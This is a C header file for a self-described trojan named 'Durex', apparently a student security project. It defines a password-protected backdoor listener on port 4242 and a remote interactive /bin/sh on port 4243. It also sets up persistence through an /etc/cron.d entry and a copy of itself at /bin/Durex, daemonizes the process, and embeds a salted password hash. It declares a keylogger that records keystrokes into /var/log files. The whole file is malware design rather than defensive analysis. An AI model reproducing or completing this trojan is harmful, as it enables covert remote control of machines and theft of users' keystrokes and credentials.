#ifndef DUREX_H
# define DUREX_H

# include "libft.h"
# include "libftprintf.h"
# include <unistd.h>
# include <stdio.h>
# include <stdlib.h>
# include <sys/select.h>
# include <get_next_line.h>

# define TROJAN_NAME "Durex"
# define BUFF_SIZE 40960
# define HELP_SIZE 4096
# define DUREX_PORT 4242
# define DUREX_SHELL_PORT 4243
# define LOG_PATH "/var/log/"TROJAN_NAME".log"
# define KEYLOG_PATH "/var/log/"TROJAN_NAME"_keylog.log"
# define KEYLOG_PARSE_PATH "/var/log/"TROJAN_NAME"_keylog_str.log"
# define KEYLOG_PARSE_SIMPLE_PATH "/var/log/"TROJAN_NAME"_keylog_simple.log"
# define REMOTE_SHELL_PATH "/bin/sh"
# define REMOTE_SHELL_ARG "-i"
# define INIT_SCRIPT "/etc/cron.d/"TROJAN_NAME
# define LOCK_PATH "/var/lock/"TROJAN_NAME".lock"
# define EXE_PATH "/bin/"TROJAN_NAME

# define MAX_ITER_SIGCHLD 10

# define FD_FREE 0
# define FD_CLIENT 1
# define FD_SRV 2
# define FD_KEYLOG 3

# define STEP_PASSWD 1
# define STEP_CMD 2
# define STEP_SH 3

# define DUREX_SALT "4089156980"
# define DUREX_PWD "\x0c\x04\x34\x20\x99\x52\x2d\x3e\x05\x8f\x5b\x21\x09\xba\x5c\x8c\xbe\x6e\xfc\x7d\x56\x4a\x6d\x19\x02\xce\x89\x71\x94\xba\xd1\x22\xda\xbe\x0c\x35\x58\x54\x15\x0a\x2f\xd8\x4e\xc1\x4a\xd5\xcc\x1b\x28\x58\xbd\xd4\xc2\xb8\x68\x10\x19\x36\x51\x98\x6f\xeb\x5d\xb5\x1f\x64\x87\xa4\xab\x2d\x1f\xfe\x62\xa7\x77\xae\xf3\xb2\x94\xe3\xf3\x5c\x6a\x39\x52\x0a\x4b\xd7\x54\xee\xb2\x1a\x47\xa9\xea\x43\x23\x2d\x06\x3d\xff\x65\x18\x47\x65\xb5\x23\xd9\xcf\xee\xc2\xe5\x9e\xeb\x9d\x4a\xb2\x6f\x55\x32\x56\x80\x36\x51\xba\x78\xd2\x49\xc2\x80\x08\xa6\x68\xca\x5c\xe2\xf3\xda\x0f\xf1\x43\x51\x60\xaf\xe5\xfc\x73\x06\x8f\x9c\x28\x7d\xbd\xd7\x8f\x19\xf5\xfe\xf7\x1c\x7f\xb3\x6d\xbf\x9a\x9d\xf5\xae\x07\xfb\x53\x81\x2a\xaf\x01\xdb\xa4\xa6\x0b\xcc\x2b\x4d\x7b\xfb\x25\x6d\xc2\xd2\x43\xc7\xfe\xb8\x90\xf8\xdd\xf4\x88\x59\x32\x0c\x00\x00\x00\x00\x02\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00"

# define DUREX_PROMPT "$> "

# define KEY_RELEASE 0
# define KEY_PRESS 1
# define KEYLOG_UK "Unknown key"

typedef unsigned long long  t_ull;

/* Keylogger */

typedef struct      s_keylog_buf
{
    unsigned int    index;
    unsigned int    len;
    char            buf[BUFF_SIZE + 1];
    int             log;
}                   t_keylog_buf;

typedef struct      s_keylog
{
    unsigned int    shift_pressed;
    unsigned int    capslock;
    int             keylog_log;
    int             keyboard_device;
    char            keylogging;
    t_keylog_buf    simple;
    t_keylog_buf    kl;
}                   t_keylog;

typedef struct      s_keylog_code
{
    t_ull           code;
    int             (*f)(t_keylog_buf *, t_ull);
}                   t_keylog_code;

/* Log */

typedef struct      s_logtype
{
    char            *log;
    char            *path;
}                   t_logtype;

/* Client */

typedef struct      s_client
{
    unsigned int    type;
    unsigned int    step;
    int             socket;
    char            *addr;
    int             port;
    unsigned int    len;
    unsigned int    pwd_try;
    char            buf[BUFF_SIZE + 1];
    pid_t           shell_pid;
}                   t_client;

/* Trojan bin */

typedef struct      s_trojan
{
    void            *bin;
    size_t          size;
    int             removed;
}                   t_trojan;

typedef struct      s_serv
{
    int             socket;
    unsigned int    max_fd;
    unsigned int    connected;
    fd_set          fd_read;
    fd_set          fd_write;
}                   t_serv;

typedef struct      s_daemon
{
    int             pid;
    int             lock;
    int             stdin;
    int             stdout;
    int             stderr;
}                   t_daemon;

/* Env */

typedef struct      s_durex
{
    int             debug;
    int             log;
    char            **env;
    char            **cmd;
    char            *path;
    t_serv          serv;
    t_client        *clients;
    t_keylog        kl;
    t_trojan        trojan;
    t_daemon        daemon;
}                   t_durex;

/* Function ptr for command line cmds */

typedef struct      s_cmd
{
    char            *cmd;
    int             (*fun)(t_durex *, int);
    char            *desc;
}                   t_cmd;

void                start_trojan(char *path);

int                 duplicate_bin(char *bin);
void                durex_log(t_durex *durex, char *s, char *type);
void                log_info(t_durex *durex, char *s);
void                log_error(t_durex *durex, char *s);
void                do_write(t_durex *durex, int socket);
void                do_read(t_durex *durex, int socket);
void                remove_client(t_durex *durex, int socket);
void                message_client(t_durex *durex, int socket, char *s);
int                 cmd_shell(t_durex *durex, int co);
int                 cmd_add(t_durex *durex, int co);
int                 cmd_remove(t_durex *durex, int co);
int                 cmd_help(t_durex *durex, int co);
int                 cmd_stop(t_durex *durex, int co);
int                 cmd_exit(t_durex *durex, int co);
int                 cmd_print_log(t_durex *durex, int co);
void                daemonize(t_durex *durex);
int                 cmd_parse(t_durex *durex, int co, char *cmd);
void                accept_client(t_durex *durex, int co);
void                check_pwd(t_durex *durex, int co, char *msg);
int                 startup_trojan(void);
int                 execute_durex(void);
int                 remove_trojan_files(void);
int                 my_system(const char *s);
void                log_debug(t_durex *durex, char *s);
int                 copy_trojan(t_trojan *trojan, char **msg);
void                save_trojan(t_trojan *trojan, char *path);
void                open_logs(t_durex *durex);
void                close_logs(t_durex *durex);
void                stop_trojan(t_durex *durex);
int                 my_kill(char *process, int sig);
void                server_loop(t_durex *durex);

int                 keylog(t_durex *durex, int co);
void                keylog_stop(t_durex *durex);
void                keylog_pressed(t_durex *durex);
int                 keylog_parse(t_keylog *kl, t_ull code, const char *name);
int                 keylog_home(t_keylog_buf *kl_buf, t_ull code);
int                 keylog_keys(t_keylog_buf *kl_buf, t_ull code);
int                 keylog_del(t_keylog_buf *kl_buf, t_ull code);
int                 keylog_enter(t_keylog_buf *kl_buf, t_ull code);

#endif
